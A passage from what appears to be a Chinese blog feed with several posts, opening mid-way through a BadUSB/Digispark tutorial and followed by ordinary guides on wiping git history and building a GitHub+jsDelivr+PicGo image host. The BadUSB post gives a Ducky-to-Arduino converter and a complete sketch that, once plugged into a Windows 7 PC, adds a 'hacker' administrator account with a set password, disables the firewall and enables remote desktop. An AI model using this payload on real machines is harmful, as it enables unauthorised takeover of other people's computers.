x'</span>, <span class="string">'KEY_X'</span>)</span><br><span class="line">.replace(<span class="string">' y'</span>, <span class="string">'KEY_Y'</span>)</span><br><span class="line">.replace(<span class="string">' z'</span>, <span class="string">'KEY_Z'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1-0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#f1-f12</span></span><br><span class="line">.replace(<span class="string">' F1'</span>,<span class="string">'KEY_F1'</span>)</span><br><span class="line">.replace(<span class="string">' F2'</span>,<span class="string">'KEY_F2'</span>)</span><br><span class="line">.replace(<span class="string">' F3'</span>,<span class="string">'KEY_F3'</span>)</span><br><span class="line">.replace(<span class="string">' F4'</span>,<span class="string">'KEY_F4'</span>)</span><br><span class="line">.replace(<span class="string">' F5'</span>,<span class="string">'KEY_F5'</span>)</span><br><span class="line">.replace(<span class="string">' F6'</span>,<span class="string">'KEY_F6'</span>)</span><br><span class="line">.replace(<span class="string">' F7'</span>,<span class="string">'KEY_F7'</span>)</span><br><span class="line">.replace(<span class="string">' F8'</span>,<span class="string">'KEY_F8'</span>)</span><br><span class="line">.replace(<span class="string">' F9'</span>,<span class="string">'KEY_F9'</span>)</span><br><span class="line">.replace(<span class="string">' F10'</span>,<span class="string">'KEY_F10'</span>)</span><br><span class="line">.replace(<span class="string">' F11'</span>,<span class="string">'KEY_F11'</span>)</span><br><span class="line">.replace(<span class="string">' F12'</span>,<span class="string">'KEY_F12'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#arrows </span></span><br><span class="line">.replace(<span class="string">'LEFTARROW'</span>, <span class="string">'KEY_ARROW_LEFT'</span>)</span><br><span class="line">.replace(<span class="string">'RIGHTARROW'</span>, <span class="string">'KEY_ARROW_RIGHT'</span>)</span><br><span class="line">.replace(<span class="string">'UPARROW'</span>,<span class="string">'KEY_ARROW_UP'</span>)</span><br><span class="line">.replace(<span class="string">'DOWNARROW'</span>,<span class="string">'KEY_ARROW_DOWN'</span>)</span><br><span class="line">.replace(<span class="string">'LEFT'</span>, <span class="string">'KEY_ARROW_LEFT'</span>)</span><br><span class="line">.replace(<span class="string">'RIGH'</span>, <span class="string">'KEY_ARROW_RIGHT'</span>)</span><br><span class="line">.replace(<span class="string">'UP'</span>,<span class="string">'KEY_ARROW_UP'</span>)</span><br><span class="line">.replace(<span class="string">'DOWN'</span>,<span class="string">'KEY_ARROW_DOWN'</span>)</span><br><span class="line"></span><br><span class="line">.replace(<span class="string">'PRINTSCREEN'</span>,<span class="string">'sendKeyStroke(KEY_PRT_SCR'</span> )</span><br><span class="line">.replace(<span class="string">'TAB'</span>, <span class="string">'sendKeyStroke(KEY_TAB'</span>)</span><br><span class="line">.replace(<span class="string">'ESCAPE'</span>,<span class="string">'KEY_ESC'</span> )</span><br><span class="line">.replace(<span class="string">'SPACE'</span>, <span class="string">'KEY_SPACE'</span>)</span><br><span class="line">.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">.replace(<span class="string">'ENTER'</span>,<span class="string">'KEY_ENTER'</span>)),end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">','</span>+mod_output, end = <span class="string">''</span>)                </span><br><span class="line">    print(<span class="string">');'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#arguments</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload_input = open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>)</span><br><span class="line">        sys.stdout = open(<span class="string">"digipayload.ino"</span>, <span class="string">"w"</span>)</span><br><span class="line">        z = len(open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>).readlines())</span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        print(<span class="string">'\nError! File "'</span>+sys.argv[<span class="number">1</span>]+<span class="string">'" does not exist!\n'</span> )</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload_input = open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>)</span><br><span class="line">        sys.stdout = open(sys.argv[<span class="number">2</span>]+<span class="string">'.ino'</span>, <span class="string">'w'</span>)</span><br><span class="line">        z = len(open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>).readlines())</span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        print(<span class="string">'\nError!, File "'</span>+sys.argv[<span class="number">1</span>]+<span class="string">'" does not exist!\n'</span> )</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">    print(<span class="string">'Too much Arguments'</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:    </span><br><span class="line">    payload_input = open(<span class="string">'payload.txt'</span>, <span class="string">"r"</span>)</span><br><span class="line">    sys.stdout = open(<span class="string">"digipayload.ino"</span>, <span class="string">"w"</span>)</span><br><span class="line">    z = len(open(<span class="string">'payload.txt'</span>, <span class="string">"r"</span>).readlines())</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------</span></span><br><span class="line"><span class="comment">#Digispark program fragment</span></span><br><span class="line">print(<span class="string">'//www.liuwx.cn&amp;Qq211124332'</span>)</span><br><span class="line">print(<span class="string">'#include "DigiKeyboard.h"'</span>)</span><br><span class="line">print(<span class="string">'#define KEY_ESC     41'</span>)</span><br><span class="line">print(<span class="string">'#define KEY_BACKSPACE 42'</span>)</span><br><span class="line">print(<span class="string">'#define KEY_TAB     43'</span>)</span><br><span class="line">print(<span class="string">'#define KEY_PRT_SCR 70'</span>)</span><br><span class="line">print(<span class="string">'#define KEY_DELETE  76\n'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'void setup() {\n'</span>)</span><br><span class="line">print(<span class="string">'DigiKeyboard.delay(5000);'</span>) <span class="comment">#windows mozhet dolgo raspoznavat digispark potomu bylo resheno dobavlyat 5 sek delay vmesto 0.5sek</span></span><br><span class="line">print(<span class="string">'DigiKeyboard.sendKeyStroke(0);'</span>)</span><br><span class="line"><span class="comment">#---------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(z):</span><br><span class="line">    l = payload_input.readline().replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> len (l) &lt; <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">''</span>, end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'REM'</span> <span class="keyword">in</span> l:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'//'</span>, l)    </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'DELAY'</span> <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'DigiKeyboard.'</span>, end = <span class="string">''</span>)</span><br><span class="line">                <span class="keyword">print</span> (l.replace(<span class="string">'DELAY'</span>, <span class="string">'delay('</span>).replace(<span class="string">' '</span>,<span class="string">''</span>), end = <span class="string">''</span>)</span><br><span class="line">                print(<span class="string">');'</span>)</span><br><span class="line">                        </span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'STRING'</span> <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'DigiKeyboard.'</span>, end = <span class="string">''</span>)</span><br><span class="line">                <span class="keyword">print</span> (l.replace(<span class="string">'"'</span>, <span class="string">'")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("'</span>)</span><br><span class="line">                       .replace(<span class="string">'\\'</span>, <span class="string">'")); DigiKeyboard.print(char(92)); DigiKeyboard.print(F("'</span>)</span><br><span class="line">                       .replace(<span class="string">'STRING '</span>,<span class="string">'print(F("'</span>), end = <span class="string">''</span>)</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'")'</span>, end = <span class="string">''</span>)</span><br><span class="line">                print(<span class="string">');'</span>);</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">elif</span> (l == <span class="string">'GUI'</span>) <span class="keyword">or</span> (l == <span class="string">'WINDOWS'</span>) <span class="keyword">or</span> (l == <span class="string">'CONTROL ESCAPE'</span>):</span><br><span class="line">                print(<span class="string">'DigiKeyboard.sendKeyStroke(KEY_ESC,MOD_CONTROL_LEFT);'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> (l == <span class="string">'GUI d'</span>) <span class="keyword">or</span> (l == <span class="string">'WINDOWS d'</span>):</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT);'</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">elif</span> (l == <span class="string">'WINDOWS r'</span>) <span class="keyword">or</span> (l == <span class="string">'GUI r'</span>):</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'MENU'</span> <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'DigiKeyboard.sendKeyStroke(MOD_GUI_RIGHT);'</span>)</span><br><span class="line">                </span><br><span class="line">        <span class="comment">#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!INVERCE!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!    </span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'CTRL ALT'</span> <span class="keyword">in</span> l:</span><br><span class="line">                replacement()</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'ALT'</span> <span class="keyword">in</span> l:</span><br><span class="line">                mod_input = <span class="string">'ALT'</span></span><br><span class="line">                mod_output = <span class="string">'MOD_ALT_RIGHT'</span></span><br><span class="line">                modreplacement()</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'CTRL'</span> <span class="keyword">in</span> l:</span><br><span class="line">                mod_input = <span class="string">'CTRL'</span></span><br><span class="line">                mod_output = <span class="string">'MOD_CONTROL_LEFT'</span></span><br><span class="line">                modreplacement()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'CONTROL'</span> <span class="keyword">in</span> l:</span><br><span class="line">                mod_input = <span class="string">'CONTROL'</span></span><br><span class="line">                mod_output = <span class="string">'MOD_CONTROL_LEFT'</span></span><br><span class="line">                modreplacement()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!        </span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                replacement()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(l) &lt;<span class="number">1</span>:</span><br><span class="line">            print(<span class="string">''</span>, end = <span class="string">''</span>)</span><br><span class="line"><span class="comment">#Digispark program fragment</span></span><br><span class="line">print(<span class="string">'\n}'</span>)</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line">print(<span class="string">'void loop() {\n'</span>)</span><br><span class="line">print(<span class="string">'}\n'</span>)</span><br><span class="line"><span class="comment">#-----------------------------------</span></span><br><span class="line"></span><br><span class="line">payload_input.close()</span><br></pre></td></tr></tbody></table></figure><p>转换完成后再当前目录下会有一个<code>hacker.ino</code>文件：</p><p><img alt="图片" data-src="img/306.png" class="lazyload"></p><p>打开后的代码是这样的：</p><p><img alt="图片" data-src="img/307.png" class="lazyload"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">//www.liuwx.cn&amp;Qq211124332</span><br><span class="line"><span class="comment">#include "DigiKeyboard.h"</span></span><br><span class="line"><span class="comment">#define KEY_ESC     41</span></span><br><span class="line"><span class="comment">#define KEY_BACKSPACE 42</span></span><br><span class="line"><span class="comment">#define KEY_TAB     43</span></span><br><span class="line"><span class="comment">#define KEY_PRT_SCR 70</span></span><br><span class="line"><span class="comment">#define KEY_DELETE  76</span></span><br><span class="line"></span><br><span class="line">void setup() {</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">5000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">5000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.print(F(<span class="string">"cmd"</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.print(F(<span class="string">"Hello Hacker!"</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">1500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void loop() {</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>3、上传脚本 - 插入<code>BadUSB</code>进行烧录程序:</p><p><img alt="图片" data-src="img/308.png" class="lazyload"></p><p>上传成功后，它会自动执行我们的操作：会在屏幕上输出Hello Hacker！</p><h2 id="插上U盘入侵局域网Win7登陆它的远程桌面"><a href="#插上U盘入侵局域网Win7登陆它的远程桌面" class="headerlink" title="插上U盘入侵局域网Win7登陆它的远程桌面"></a>插上U盘入侵局域网Win7登陆它的远程桌面</h2><blockquote><p>本来想写MSF + BadUSB 反弹Win7和Win10的Shell，但是百度上有了，我就没必要写在这篇文章了！</p></blockquote><h3 id="思路和主要步骤"><a href="#思路和主要步骤" class="headerlink" title="思路和主要步骤"></a>思路和主要步骤</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、在局域网中有一台PC-Win7系统</span><br><span class="line"></span><br><span class="line">2、插上BadUSB关掉Win7的防火墙</span><br><span class="line"></span><br><span class="line">3、创建一个HACKER的用户并提权为超级管理员</span><br><span class="line"></span><br><span class="line">4、开启Win7的3389</span><br><span class="line"></span><br><span class="line">5、局域网另一台电脑mstsc登陆Win7的桌面</span><br></pre></td></tr></tbody></table></figure><h3 id="命令注释"><a href="#命令注释" class="headerlink" title="命令注释"></a>命令注释</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">关闭防火墙的命令：netsh firewall set opmode mode=disable</span><br><span class="line"></span><br><span class="line">打开Win7的3389命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">至于我为什么会吧上面这条开3389的命令有些字母是大写又有些字母是小写：</span><br><span class="line"></span><br><span class="line">reg add hklm\\system\\cURRENTcONTROLsET\\cONTROL\\tERMINAL\" \"sERVER /V FdENYtscONNECTIONS /T reg_dword /D 0 /F</span><br><span class="line"></span><br><span class="line">因为插入BadUSB会首先按下我们的大写锁定!然后才执行命令，因为怕有的电脑有中午输入法！所以我上面的语句要这样写！他会吧小写的在DOS窗口输出为大写，大写的命令会输出为小写！</span><br><span class="line"></span><br><span class="line">按下回车键：DigiKeyboard.sendKeyStroke(KEY_ENTER); </span><br><span class="line"></span><br><span class="line">延迟2秒执行（有的时候延迟时间短了会执行失败）：DigiKeyboard.delay(2000);</span><br></pre></td></tr></tbody></table></figure><p>附上代码如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//www.liuwx.cn QQ211124332</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"DigiKeyboard.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_ESC     41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_BACKSPACE 42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_TAB     43</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_PRT_SCR 70</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_DELETE  76</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_CAPS_LOCK  0x39</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>{</span><br><span class="line"></span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK);</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">"cmd"</span>));</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">"color c"</span>));</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">"net user hacker Qliuwx123@ /add"</span>));</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">"net localgroup administrators hacker /add"</span>));</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">"netsh firewall set opmode mode=disable"</span>)); <span class="comment">//关闭防火墙</span></span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">"reg add hklm\\system\\cURRENTcONTROLsET\\cONTROL\\tERMINAL\" \"sERVER /V FdENYtscONNECTIONS /T reg_dword /D 0 /F"</span>));  <span class="comment">//开3389</span></span><br><span class="line">DigiKeyboard.<span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>{</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>具体演示的效果我放到了B站上：</p><p><a href="https://www.bilibili.com/video/av69355396" target="_blank" rel="noopener">插上U盘开启Win7的3389并关闭防火墙实施登陆它远程桌面</a></p></div>]]></content>
      
      
      <categories>
          
          <category> hack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> U盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github清除历史提交，保留最新提交</title>
      <link href="Github%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E6%8F%90%E4%BA%A4%EF%BC%8C%E4%BF%9D%E7%95%99%E6%9C%80%E6%96%B0%E6%8F%90%E4%BA%A4.html"/>
      <url>Github%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E6%8F%90%E4%BA%A4%EF%BC%8C%E4%BF%9D%E7%95%99%E6%9C%80%E6%96%B0%E6%8F%90%E4%BA%A4.html</url>
      
        <content type="html"><![CDATA[<h1 id="Github清除历史提交，保留最新提交"><a href="#Github清除历史提交，保留最新提交" class="headerlink" title="Github清除历史提交，保留最新提交"></a>Github清除历史提交，保留最新提交</h1><h2 id="有时候，需要启动一个新的分支，同时想摒弃历史信息，那么可以使用下面的方法来实现"><a href="#有时候，需要启动一个新的分支，同时想摒弃历史信息，那么可以使用下面的方法来实现" class="headerlink" title="有时候，需要启动一个新的分支，同时想摒弃历史信息，那么可以使用下面的方法来实现"></a>有时候，需要启动一个新的分支，同时想摒弃历史信息，那么可以使用下面的方法来实现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#克隆git仓库</span><br><span class="line">git clone [URL] </span><br><span class="line">#进入git仓库</span><br><span class="line">cd [仓库名] </span><br><span class="line"></span><br><span class="line">#创建一个名为 new_branch 新的空分支(不包含历史的分支)</span><br><span class="line">git checkout --orphan  new_branch</span><br><span class="line"></span><br><span class="line">#添加所有文件到new_branch分支，对new_branch分支做一次提交</span><br><span class="line">git add -A</span><br><span class="line">git commit -am &#39;提交信息&#39; </span><br><span class="line"></span><br><span class="line">#删除master分支</span><br><span class="line">git branch -D master </span><br><span class="line">#将当前所在的new_branch分支重命名为master</span><br><span class="line">git branch -m master</span><br><span class="line">#将更改强制推送到github仓库</span><br><span class="line">git push origin master --force</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT </tag>
            
            <tag> git </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github+jsDelivr+PicGo 打造稳定快速、高效免费图床</title>
      <link href="pic-go.html"/>
      <url>pic-go.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="Github-jsDelivr-PicGo-打造稳定快速、高效免费图床"><a href="#Github-jsDelivr-PicGo-打造稳定快速、高效免费图床" class="headerlink" title="Github+jsDelivr+PicGo 打造稳定快速、高效免费图床"></a>Github+jsDelivr+PicGo 打造稳定快速、高效免费图床</h1><section class="article typo">        <div class="article-entry" itemprop="articleBody">          <fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/ImgHosting.png"><img alt="ImgHosting" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/ImgHosting.png" class="lazyload"></a><br></fancybox><hr><h1 id="–-前言"><a href="#–-前言" class="headerlink" title="– 前言"></a><font color="#FF000">– 前言</font></h1><p>图床是个啥东西就不用过多介绍了，先来对比一下各路图床：</p><blockquote><ul><li>微博图床：以前用的人比较多，从2019年4月开始开启了防盗链，凉凉</li><li>SM.MS：运营四年多了，也变得越来越慢了，到了晚上直接打不开图片，速度堪忧</li><li>其他小众图床：随时有挂掉的风险</li><li>Imgur等国外图床：国内访问速度太慢，随时有被墙的风险</li><li>大厂储存服务：例如七牛云、又拍云、腾讯云COS、阿里云OSS等，容量限制，操作繁琐，又是实名认证又是域名备案的，麻烦，而且还要花钱（有钱又不怕麻烦的当我没说）</li></ul></blockquote><p>因此，GitHub 图床是个不错的选择，利用 jsDelivr CDN 加速访问（jsDelivr 是一个免费开源的 CDN 解决方案），PicGo 工具一键上传，操作简单高效，GitHub 和 jsDelivr 都是大厂，不用担心跑路问题，不用担心速度和容量问题，而且完全免费，可以说是目前免费图床的最佳解决方案！</p><hr><h1 id="–-新建GitHub仓库"><a href="#–-新建GitHub仓库" class="headerlink" title="– 新建GitHub仓库"></a><font color="#FF000">– 新建GitHub仓库</font></h1><p>登录/注册GitHub，新建一个仓库，填写好仓库名，仓库描述，根据需求选择是否为仓库初始化一个README.md描述文件</p><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/01.png"><img alt="01" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/01.png" class="lazyload"></a><br></fancybox><br><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/02.png"><img alt="02" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/02.png" class="lazyload"></a><br></fancybox><hr><h1 id="–-生成一个Token"><a href="#–-生成一个Token" class="headerlink" title="– 生成一个Token"></a><font color="#FF000">– 生成一个Token</font></h1><p>在主页依次选择【Settings】-【Developer settings】-【Personal access tokens】-【Generate new token】，填写好描述，勾选【repo】，然后点击【Generate token】生成一个Token，注意这个Token只会显示一次，自己先保存下来，或者等后面配置好PicGo后再关闭此网页</p><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/03.png"><img alt="03" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/03.png" class="lazyload"></a><br></fancybox><br><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/04.png"><img alt="04" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/04.png" class="lazyload"></a><br></fancybox><br><fancybox><br><a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/05.png"><img alt="05" data-src="https://cdn.jsdelivr.net/gh/TRHX/ImageHosting/ITRHX-PIC/A27/05.png" 